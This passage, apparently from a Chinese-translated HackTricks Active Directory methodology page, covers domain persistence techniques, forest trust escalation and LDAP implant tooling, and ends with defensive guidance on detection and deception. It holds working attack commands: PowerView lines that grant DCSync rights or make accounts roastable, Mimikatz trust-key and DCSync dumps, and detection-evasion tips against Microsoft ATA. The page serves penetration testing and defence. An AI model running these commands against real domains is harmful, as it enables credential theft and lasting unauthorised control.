一旦获得 **Domain Admin**，或者更好的是 **Enterprise Admin** 权限，就可以 **dump** **domain database**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md)。

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前面讨论的一些技术也可以用于 persistence。\
例如，你可以：

- 使用户容易受到 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户容易受到 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 向用户授予 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 通过使用 **NTLM hash**（例如 **PC account 的 hash**），为特定服务创建一个**合法的 Ticket Granting Service (TGS) ticket**。这种方法用于**访问服务权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 是指攻击者获取 Active Directory (AD) 环境中 **krbtgt account 的 NTLM hash**。该账户很特殊，因为它用于签署所有 **Ticket Granting Tickets (TGTs)**，而这些票据对于在 AD 网络中进行身份验证至关重要。

获得该 hash 后，攻击者可以为任意选定的账户创建 **TGTs**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据类似于 golden tickets，但其伪造方式可以**绕过常见的 golden tickets 检测机制。**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的证书，或能够申请这些证书**，是实现用户账户 persistence 的一种非常有效的方法（即使用户更改密码也不受影响）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在 domain 内以高权限实现 persistence：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过在这些**特权组**（如 Domain Admins 和 Enterprise Admins）上应用标准的 **Access Control List (ACL)**，确保其安全并防止未经授权的修改。然而，此功能也可能被利用：如果攻击者修改 AdminSDHolder 的 ACL，为普通用户授予完全访问权限，该用户就能广泛控制所有特权组。这项原本用于保护系统的安全措施，可能因此适得其反；除非受到密切监控，否则会允许未经授权的访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

每个 **Domain Controller (DC)** 内部都存在一个**本地 administrator** 账户。获得此类计算机的 admin 权限后，可以使用 **mimikatz** 提取本地 Administrator hash。之后还需要修改注册表来**启用该密码的使用**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以为某个**用户**授予其对特定 domain objects 的一些**特殊权限**，从而让该用户在**未来提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于**存储**一个**对象**对另一个**对象**拥有的**权限**。如果你能够对某个对象的 **security descriptor** 进行哪怕**很小的修改**，就可以在无需加入特权组的情况下，获得对该对象非常有价值的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` auxiliary class，利用 `entryTTL`/`msDS-Entry-Time-To-Die` 创建短生命周期的 principals/GPOs/DNS records；它们会自动删除且不留下 tombstones，从而清除 LDAP 证据，同时留下孤立的 SIDs、损坏的 `gPLink` references，或缓存的 DNS responses（例如 AdminSDHolder ACE 污染，或恶意的 `gPCFileSysPath`/AD-integrated DNS redirects）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

修改内存中的 **LSASS**，建立一个**通用密码**，从而获得对所有 domain accounts 的访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建**自己的 SSP**，以**明文**捕获用于访问计算机的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**，并利用它向指定对象**推送属性**（SIDHistory、SPNs……），且不会留下有关这些**修改**的任何**日志**。你**需要 DA** 权限，并且必须位于 **root domain** 中。\
注意，如果使用了错误的数据，将会出现非常明显且难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论过，在拥有**足够权限读取 LAPS passwords** 的情况下如何提升权限。然而，这些密码也可以用于**维持 persistence**。\
请参阅：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着，**compromise 单个 domain 可能导致整个 Forest 被 compromise**。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许来自一个 **domain** 的用户访问另一个 **domain** 中的资源。它本质上是在两个 domain 的身份验证系统之间建立连接，使身份验证验证能够无缝流转。当 domain 建立 trust 时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保存特定的 **keys**，这些 keys 对 trust 的完整性至关重要。

在典型场景中，如果用户想要访问 **trusted domain** 中的服务，必须先从自己 domain 的 DC 请求一个称为 **inter-realm TGT** 的特殊票据。该 TGT 使用两个 domain 共同约定的共享 **key** 进行加密。随后，用户将此 TGT 提交给 **trusted domain 的 DC**，以获取服务票据（**TGS**）。trusted domain 的 DC 成功验证 inter-realm TGT 后，会签发 TGS，授予用户访问该服务的权限。

**Steps**：

1. **Domain 1** 中的**client computer** 使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，从而开始流程。
2. 如果 client 身份验证成功，DC1 会签发新的 TGT。
3. 随后，client 向 DC1 请求 **inter-realm TGT**，该票据用于访问 **Domain 2** 中的资源。
4. inter-realm TGT 使用 DC1 和 DC2 之间因双向 domain trust 共享的 **trust key** 进行加密。
5. client 将 inter-realm TGT 提交给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享 trust key 验证 inter-realm TGT；如果有效，则为 client 想要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，client 将使用服务器账户 hash 加密的 TGS 提交给服务器，以获取 Domain 2 中服务的访问权限。

### Different trusts

需要注意，**trust 可以是单向或双向的**。在双向选项中，两个 domain 会相互信任；而在**单向** trust 关系中，一个 domain 是 **trusted** domain，另一个是 **trusting** domain。在后一种情况下，**你只能从 trusted domain 访问 trusting domain 中的资源**。

如果 Domain A 信任 Domain B，则 A 是 trusting domain，B 是 trusted domain。此外，在 **Domain A** 中，这属于 **Outbound trust**；而在 **Domain B** 中，这属于 **Inbound trust**。

**Different trusting relationships**

- **Parent-Child Trusts**：这是同一 forest 中常见的配置，child domain 会自动与其 parent domain 建立双向、可传递的 trust。本质上，这意味着身份验证请求可以在 parent 和 child 之间无缝流转。
- **Cross-link Trusts**：也称为 "shortcut trusts"，建立在 child domains 之间，用于加快 referral 流程。在复杂的 forests 中，身份验证 referrals 通常必须先到达 forest root，再返回目标 domain。通过创建 cross-links，可以缩短这一过程，这对于地理位置分散的环境尤其有益。
- **External Trusts**：建立在不同且互不相关的 domains 之间，具有不可传递性。根据 [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 适用于访问当前 forest 之外、且未通过 forest trust 连接的 domain 中的资源。external trusts 通过 SID filtering 增强安全性。
- **Tree-root Trusts**：这些 trust 会在 forest root domain 与新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对向 forest 添加新的 domain trees 很重要，使其能够保留独特的 domain name，并确保双向可传递性。更多信息请参阅 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这是两个 forest root domains 之间的双向、可传递 trust，同时强制执行 SID filtering 以增强安全性。
- **MIT Trusts**：这些 trust 建立在非 Windows、符合 [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) 的 Kerberos domains 之间。MIT trusts 更为专用，用于需要与 Windows 生态系统之外的 Kerberos-based systems 集成的环境。

#### Other differences in **trusting relationships**

- trust relationship 也可以是**可传递的**（A trust B，B trust C，则 A trust C）或**不可传递的**。
- trust relationship 可以设置为**双向 trust**（双方互相信任）或**单向 trust**（只有一方信任另一方）。

### Attack Path

1. **枚举** trusting relationships
2. 检查是否有任何 **security principal**（user/group/computer）可以**访问** **other domain** 的资源，例如通过 ACE entries，或因为其属于 other domain 的 groups。寻找**跨 domain 的 relationships**（trust 可能正是为此创建的）。
1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **Compromise** 能够在 domains 之间进行 **pivot** 的**账户**。

攻击者可以通过以下三种主要机制访问另一个 domain 中的资源：

- **Local Group Membership**：principals 可能被添加到计算机上的本地 groups，例如服务器上的 “Administrators” group，从而获得对该计算机的重大控制权。
- **Foreign Domain Group Membership**：principals 也可以成为 foreign domain 中 groups 的成员。但这种方法的有效性取决于 trust 的性质和 group 的范围。
- **Access Control Lists (ACLs)**：principals 可能被指定在 **ACL** 中，尤其是作为 **DACL** 内 **ACEs** 中的实体，从而获得对特定资源的访问权限。对于希望深入了解 ACLs、DACLs 和 ACEs 工作机制的读者，标题为 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 的 whitepaper 是非常有价值的资源。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**，以查找 domain 中的 foreign security principals。这些对象将是来自**外部 domain/forest** 的 user/group。

你可以在 **Bloodhound** 中检查这些内容，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子域到父域林权限提升
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任关系的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> You can the one used by the current domain them with:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用 trust 和 SID-History injection，提升为 child/parent domain 的 Enterprise admin：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

了解如何利用 Configuration Naming Context (NC) 至关重要。在 Active Directory (AD) 环境中，Configuration NC 作为整个 forest 的配置数据中央存储库。这些数据会复制到 forest 内的每个 Domain Controller (DC)，其中可写 DC 会维护 Configuration NC 的可写副本。要利用这一点，必须在某个 DC 上拥有 **SYSTEM privileges**，最好是 child DC。

**Link GPO to root DC site**

Configuration NC 的 Sites container 包含 AD forest 内所有已加入 domain 的计算机站点信息。通过在任意 DC 上使用 SYSTEM privileges，攻击者可以将 GPO 链接到 root DC sites。此操作可能通过操纵应用于这些站点的策略来 compromise root domain。

如需深入了解，可以参考关于 [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) 的研究。<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

一种 attack vector 是 targeting domain 内具有 privileged 权限的 gMSA。用于计算 gMSA passwords 的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上拥有 SYSTEM privileges 后，即可访问 KDS Root key，并计算 forest 内任意 gMSA 的 passwords。

详细分析和分步说明请参见：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

此方法需要耐心等待新的 privileged AD objects 被创建。拥有 SYSTEM privileges 后，攻击者可以修改 AD Schema，使任意 user 获得对所有 classes 的 complete control。这可能导致对新创建 AD objects 的 unauthorized access 和 control。

更多内容请参见 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)。<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability 针对 Public Key Infrastructure (PKI) objects 的 control，可用于创建一个 certificate template，使其能够以 forest 内任意 user 的身份进行 authentication。由于 PKI objects 位于 Configuration NC 中，compromise 一个可写 child DC 后即可执行 ESC5 attacks。

更多详情请参见 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)。<sup>[[15]](#references)</sup> 在没有 ADCS 的场景中，攻击者仍可设置所需组件，具体讨论见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中，**你的域受外部域信任**，因此你对该外部域拥有**未确定的权限**。你需要找出**你所在域的哪些主体对外部域拥有哪些访问权限**，然后尝试利用这些权限：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部 Forest Domain - 单向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在此场景中，**你的域**正在向来自**不同域**的 principal 授予某些**权限**。

然而，当某个**域被信任**时，信任域会创建一个使用**可预测名称**的用户，并将**被信任域的密码**作为该用户的**密码**。这意味着，可以**访问信任域中的用户，从而进入被信任域**，对其进行枚举并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种入侵被信任域的方法，是找到一个创建方向与域信任方向**相反**的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种入侵被信任域的方法，是在一台**被信任域用户可以访问**的机器上等待其通过 **RDP** 登录。随后，攻击者可以向 RDP 会话进程中注入代码，并从那里**访问受害者的源域**。\
此外，如果**受害者挂载了其硬盘**，攻击者还可以从 **RDP 会话**进程中，将**后门**写入该硬盘的**启动文件夹**。此技术称为 **RDPInception。**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解措施

### **SID Filtering：**

- 利用跨 forest trust 的 SID history 属性发起攻击的风险，可通过 SID Filtering 缓解；SID Filtering 默认在所有 inter-forest trust 上启用。这建立在 intra-forest trust 安全的假设之上，因为按照 Microsoft 的观点，安全边界是 forest 而非 domain。
- 但是，这存在一个问题：SID filtering 可能会中断应用程序和用户访问，因此有时会被禁用。

### **Selective Authentication：**

- 对于 inter-forest trust，使用 Selective Authentication 可确保来自两个 forest 的用户不会被自动认证。相反，用户必须拥有显式权限，才能访问信任域或 forest 中的域和服务器。
- 需要注意的是，这些措施无法防护对可写 Configuration Naming Context (NC) 的利用，也无法防护针对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP primitives 重新实现为 x64 Beacon Object Files，可完全在 on-host implant（例如 Adaptix C2）内部运行。Operators 使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该工具包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都通过当前 logon security context，经由带 signing/sealing 的 LDAP（389）或带 auto certificate trust 的 LDAPS（636）传输，因此不需要 socks proxies 或磁盘 artifacts。<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 将短名称/OU 路径解析为完整 DN，并导出相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 从 `rootDSE` 中获取任意属性（包括 security descriptors），以及 forest/domain 元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 直接从 LDAP 中暴露 roasting candidates、delegation settings，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors。
- `get-acl` 和 `get-writable --detailed` 解析 DACL，列出 trustees、权限（GenericAll/WriteDACL/WriteOwner/attribute writes）以及 inheritance，从而立即确定 ACL privilege escalation 的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 用于提权与持久化的 LDAP 写入原语

- Object creation BOFs（`add-user`、`add-computer`、`add-group`、`add-ou`）允许 operator 在拥有 OU 权限的任意位置预置新的 principal 或 machine account。找到 write-property 权限后，`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 可直接劫持目标。
- 以 ACL 为重点的命令（如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`）可将任意 AD object 上的 WriteDACL/WriteOwner 转化为密码重置、组成员控制或 DCSync replication privileges，且不会留下 PowerShell/ADSI artifacts。对应的 `remove-*` 命令可清理注入的 ACE。

### Delegation、roasting 与 Kerberos abuse

- `add-spn`/`set-spn` 可立即使 compromised user 具备 Kerberoast 条件；`add-asreproastable`（UAC toggle）可在不接触密码的情况下将其标记为 AS-REP roasting 目标。
- Delegation macros（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC flags 或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，启用 constrained/unconstrained/RBCD attack paths，并无需 remote PowerShell 或 RSAT。

### sidHistory 注入、OU relocation 与 attack surface shaping

- `add-sidhistory` 将 privileged SIDs 注入受控 principal 的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 完成隐蔽的 access inheritance。
- `move-object` 可更改 computers 或 users 的 DN/OU，使 attacker 能够先将 assets 拖入已有 delegated rights 的 OUs，再滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 严格限定范围的 removal commands（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）支持 operator 在 harvest credentials 或建立 persistence 后快速 rollback，从而最大限度减少 telemetry。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**在此详细了解如何保护 credentials。**](../stealing-credentials/credentials-protections.md)

### **Credential Protection 的防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录 Domain Controllers，避免在其他 hosts 上使用这些账户。
- **Service Account 权限**：不应使用 Domain Admin（DA）权限运行 services，以维护安全性。
- **Temporal Privilege Limitation**：对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay attempts。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity 的 protocol-level fingerprinting

如果希望检测常见的 AD tradecraft，**不要仅依赖 operator 可控制的 artifacts**，例如重命名的 binaries、service names、临时 batch files 或 output paths。应建立合法 Windows clients 构造 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI traffic 的 baseline，然后寻找即使 operator 修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 仍会保留的 **implementation quirks**。<sup>[[8]](#references)</sup>

- **高置信度的 standalone candidates**（根据自身 baseline 验证后）：
- 使用 `auth_context_id = 79231 + ctx_id` 的 authenticated DCE/RPC
- 填充为 `0xff` 的 DCE/RPC authentication padding
- LDAP Kerberos binds 将原始 Kerberos `AP-REQ` 直接放入 SPNEGO `mechToken`
- 带有类似 ASCII 的 `ClientGuid` 值的 SMB2/3 negotiate requests
- 使用非标准 namespace `//./root/cimv2` 的 WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce values
- **更适合作为 correlation/scoring features**：
- 稀疏或重复的 Kerberos etype lists、异常或缺失的 `PA-DATA`，或不同于 native Windows 的 TGS-REQ etype ordering
- 缺失 version info 的 NTLM Type 1 messages，或 host names 为 null 的 Type 3 messages
- 在 DCE/RPC 中使用 raw NTLMSSP 而非 SPNEGO、缺失 DCE/RPC verification trailers，或 SPNEGO/Kerberos OID mismatches
- 同一 host/user/session/time window 出现多项此类 traits，其可信度远高于任何单一 weak field
- **用作 enrichment，而非 standalone alerts**：
- Default filenames、output paths、random service names、temporary batch names、default computer account names，以及 tool-specific HTTP/WebDAV/RDP/MSSQL strings
- operator 很容易修改这些内容，因此最好用于解释为何某个 cross-protocol cluster 可疑
- **Operational notes**：
- 某些 signals 需要 decrypted traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或 service-side visibility
- 在将其提升为 alerts 前，应针对 Samba/Linux clients、appliances 和 legacy software 进行验证
- 随着对 baseline 的信心增加，将 detections 从 enrichment -> hunting -> alerting 逐步提升

### **Implementing Deception Techniques**

- Implementing deception 涉及设置 traps，例如 decoy users 或 computers，并赋予密码永不过期或标记为 Trusted for Delegation 等特征。详细方法包括创建具有特定 rights 的 users，或将其加入 high privilege groups。<sup>[[2]](#references)</sup>
- 一个实际示例是使用以下 tools：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 关于部署 deception techniques 的更多信息，请参见 [GitHub 上的 Deploy-Deception](https://github.com/samratashok/Deploy-Deception)。

### **Identifying Deception**

- **对于 User Objects**：可疑 indicators 包括异常的 ObjectSID、不频繁的 logons、creation dates 以及较低的 bad password counts。
- **General Indicators**：将潜在 decoy objects 的 attributes 与 genuine objects 的 attributes 进行比较，可以发现 inconsistencies。诸如 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 等 tools 可协助识别此类 deception。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**：
- **User Enumeration**：避免在 Domain Controllers 上进行 session enumeration，以防止触发 ATA detection。
- **Ticket Impersonation**：使用 **aes** keys 创建 tickets，有助于通过不降级为 NTLM 来规避 detection。
- **DCSync Attacks**：建议从非 Domain Controller 执行，以避免 ATA detection；直接从 Domain Controller 执行将触发 alerts。

## References

- [1] [攻击 Domain Trusts 指南](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [在 Active Directory 中伪造 Trusts 进行 Deception](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [从 Domain Admin 到 Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – 用于 Active Directory Exploitation 的 In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! 将 NTLM Hashes Weaponize 为 Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – 剖析 Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon：通过 Netlogon 接管 Active Directory Accounts](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - 如何管理与 CVE-2020-1472 相关的 Netlogon secure channel connections changes](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [深入探索被遗忘的 Null Session 和 MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter 是否是 domains 之间的 security boundary？（第 4 部分）- Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter 是否是 domains 之间的 security boundary？（第 5 部分）- Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter 是否是 domains 之间的 security boundary？（第 6 部分）- Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [通过 ESC5 从 DA 到 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [通过滥用 AD CS 在 5 分钟内从 child domain's admins 提升到 enterprise admins，后续篇](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve：设计 Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
